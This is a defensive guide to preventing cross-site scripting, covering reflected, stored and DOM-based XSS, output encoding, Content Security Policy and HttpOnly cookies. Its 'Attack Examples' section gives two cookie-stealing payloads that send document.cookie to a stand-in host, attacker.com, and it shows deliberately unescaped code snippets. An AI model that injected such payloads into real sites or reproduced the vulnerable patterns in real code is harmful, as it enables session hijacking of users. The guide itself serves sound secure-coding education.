# Cross-Site Scripting (XSS) — Prevention Guide

## Overview

Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users. Classified as OWASP A03:2021 — Injection. Three types: Stored, Reflected, and DOM-based.

## Attack Examples

```html
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">
```

## Vulnerable Patterns

### Reflected XSS
```python
# Flask — unsanitized output
return f"<p>Hello, {username}!</p>"
```

### Stored XSS
```java
// JSP — rendering user comment without escaping
<%= comment.getText() %>
```

### DOM-based XSS
```javascript
document.getElementById('output').innerHTML = location.hash.substring(1);
```

## Prevention Strategies

### Output Encoding (Primary Defense)

Always encode data before rendering in HTML context.

**Python (Jinja2 auto-escapes by default):**
```python
return render_template("profile.html", username=username)  # Auto-escaped
# Never use | safe filter on user data
```

**Java (OWASP Encoder):**
```java
String safe = Encode.forHtml(userInput);
String safeForJs = Encode.forJs(userInput);
String safeForUrl = Encode.forUriComponent(userInput);
```

### Content Security Policy (CSP)

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
```

### Input Validation

Validate input format and length, but never rely on input validation alone for XSS prevention — always encode output.

### HTTP-Only Cookies

Set `HttpOnly` flag on session cookies to prevent JavaScript access:
```
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

## Framework-Specific Notes

- **React/Next.js:** JSX auto-escapes by default. Avoid `dangerouslySetInnerHTML` with user data.
- **Vue.js:** `{{ }}` interpolation auto-escapes. Avoid `v-html` with user data.
- **Django:** Use `{{ variable }}` (auto-escaped). Never use `| safe` on user input.

## Detection Checklist

- [ ] User input rendered in HTML without encoding
- [ ] Use of `innerHTML`, `document.write()` with dynamic content
- [ ] `dangerouslySetInnerHTML` in React with user data
- [ ] Missing Content-Security-Policy header
- [ ] Cookies without HttpOnly flag

## Remediation Severity

| Type | Severity |
|------|----------|
| Stored XSS | High |
| Reflected XSS | Medium-High |
| DOM-based XSS | Medium |
| Missing CSP (defense in depth) | Low |
